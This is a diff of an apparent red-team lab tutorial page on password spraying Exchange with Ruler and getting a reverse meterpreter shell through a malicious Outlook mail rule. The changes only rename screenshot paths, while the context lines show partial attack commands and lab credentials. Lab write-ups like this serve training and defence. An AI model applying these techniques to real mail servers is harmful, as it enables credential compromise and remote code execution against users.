@@ -42,15 +42,15 @@ ruler -k --domain offense.local brute --users users --passwords passwords --verb
 ```
 {% endcode %}
 
-![](../../.gitbook/assets/screenshot-from-2018-12-23-15-09-03.png)
+![](<../../.gitbook/assets/Screenshot from 2018-12-23 15-09-03.png>)
 
-![](../../.gitbook/assets/peek-2018-12-23-15-07.gif)
+![](<../../.gitbook/assets/Peek 2018-12-23 15-07.gif>)
 
 The above shows that password spray was successful against the user `spotless` who used a weak password `123456`.
 
 Note, that if you are attempting to replicate this technique in your own labs, you may need to update your `/etc/hosts` to point to your Exchange server:
 
-![](../../.gitbook/assets/screenshot-from-2018-12-23-15-08-18.png)
+![](<../../.gitbook/assets/Screenshot from 2018-12-23 15-08-18.png>)
 
 ## Getting a Shell via Malicious Email Rule
 
@@ -79,7 +79,7 @@ ruler -k --verbose --email spotless@offense.local -u spotless -p 123456  display
 
 The below suggests the credentials are working and that no mail rules are set for this account yet:
 
-![](../../.gitbook/assets/screenshot-from-2018-12-23-17-15-36.png)
+![](<../../.gitbook/assets/Screenshot from 2018-12-23 17-15-36.png>)
 
 To carry out the attack further, I've generated a reverse meterpreter payload and saved it as a windows executable in `/root/tools/evilm64.exe`&#x20;
 
@@ -112,11 +112,11 @@ ruler -k --verbose --email spotless@offense.local --username spotless -p 123456 
 
 Below shows the entire attack and all of the steps mentioned above in action - note how the compromised mailbox does not even get to see the malicious email coming in:
 
-![](../../.gitbook/assets/peek-2018-12-23-18-13.gif)
+![](<../../.gitbook/assets/Peek 2018-12-23 18-13.gif>)
 
 Below shows the actual malicious rule that got created as part of the attack - note the `subject` and the `start` properties - we specified them in the ruler command:
 
-![](../../.gitbook/assets/screenshot-from-2018-12-23-18-17-10.png)
+![](<../../.gitbook/assets/Screenshot from 2018-12-23 18-17-10.png>)
 
 If you want to delete the malicious email rule, do this:
 
